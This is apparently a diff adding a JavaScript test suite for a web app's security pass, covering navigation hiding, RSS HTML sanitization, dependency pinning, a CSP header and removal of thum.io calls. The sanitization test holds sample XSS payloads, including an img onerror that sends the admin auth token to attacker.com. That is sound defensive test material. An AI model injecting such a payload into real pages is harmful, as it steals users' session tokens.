@@ -847,5 +847,81 @@ describe('Task 101: Shared Backend Proxy Route & Public Relay Elimination', () =
   });
 });
 
+describe('Task 102: Browser Security Pass (Sandbox Iframe, RSS Sanitization, CSP & Pinned Dependencies)', () => {
+  it('hides Sandbox Browser from launch menu and visible navigation groups', async () => {
+    const { NAV_GROUPS, isVisible, VISIBLE_NAV_GROUPS } = await import('../../src/data/navigation');
+    const allItems = NAV_GROUPS.flatMap(g => g.items);
+    const sandboxItem = allItems.find(i => i.id === 'sandbox');
+
+    expect(sandboxItem).toBeDefined();
+    expect(sandboxItem?.status).toBe('hidden');
+    expect(isVisible(sandboxItem!)).toBe(false);
+
+    // Verify it is excluded from visible nav groups
+    const visibleIds = VISIBLE_NAV_GROUPS.flatMap(g => g.items).map(i => i.id);
+    expect(visibleIds).not.toContain('sandbox');
+  });
+
+  it('sanitizes RSS HTML content using DOMPurify and strips scripts and inline event handlers', async () => {
+    const { sanitizeText } = await import('../../services/news');
+
+    const maliciousHtml = `
+      <div>
+        <h3>Critical Remote Code Execution Advisory</h3>
+        <script>alert("XSS")</script>
+        <p>Attackers are actively exploiting CVE-2026-1234. <img src=x onerror="fetch('http://attacker.com?token='+localStorage.getItem('admin-auth-token'))" /></p>
+        <iframe src="javascript:alert(1)"></iframe>
+      </div>
+    `;
+
+    const cleaned = sanitizeText(maliciousHtml);
+    expect(cleaned).not.toContain('<script>');
+    expect(cleaned).not.toContain('alert');
+    expect(cleaned).not.toContain('onerror');
+    expect(cleaned).not.toContain('<iframe>');
+    expect(cleaned).toContain('Critical Remote Code Execution Advisory');
+    expect(cleaned).toContain('CVE-2026-1234');
+  });
+
+  it('verifies that @google/genai is pinned to an exact version in package.json', async () => {
+    const fs = await import('fs');
+    const path = await import('path');
+    const pkgPath = path.resolve(process.cwd(), 'package.json');
+    const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
+
+    const genaiVersion = pkg.dependencies?.['@google/genai'];
+    expect(genaiVersion).toBeDefined();
+    expect(genaiVersion).not.toBe('latest');
+    expect(genaiVersion).toBe('1.40.0');
+  });
+
+  it('verifies Content Security Policy meta tag exists in index.html with strict directives', async () => {
+    const fs = await import('fs');
+    const path = await import('path');
+    const htmlPath = path.resolve(process.cwd(), 'index.html');
+    const html = fs.readFileSync(htmlPath, 'utf-8');
+
+    expect(html).toContain('http-equiv="Content-Security-Policy"');
+    expect(html).toContain("default-src 'self'");
+    expect(html).toContain("script-src 'self'");
+    // Must NOT permit inline scripts in production policy
+    expect(html).not.toMatch(/script-src[^;]*'unsafe-inline'/);
+    expect(html).toContain('connect-src');
+  });
+
+  it('verifies no active calls to thum.io exist in services to prevent customer data leakage', async () => {
+    const fs = await import('fs');
+    const path = await import('path');
+
+    const webcheckContent = fs.readFileSync(path.resolve(process.cwd(), 'services/webcheck.ts'), 'utf-8');
+    const brandContent = fs.readFileSync(path.resolve(process.cwd(), 'services/brandMonitor.ts'), 'utf-8');
+
+    // Make sure no active URLs to image.thum.io are constructed
+    expect(webcheckContent).not.toMatch(/https:\/\/image\.thum\.io/);
+    expect(brandContent).not.toMatch(/https:\/\/image\.thum\.io/);
+  });
+});
+
+
 
 
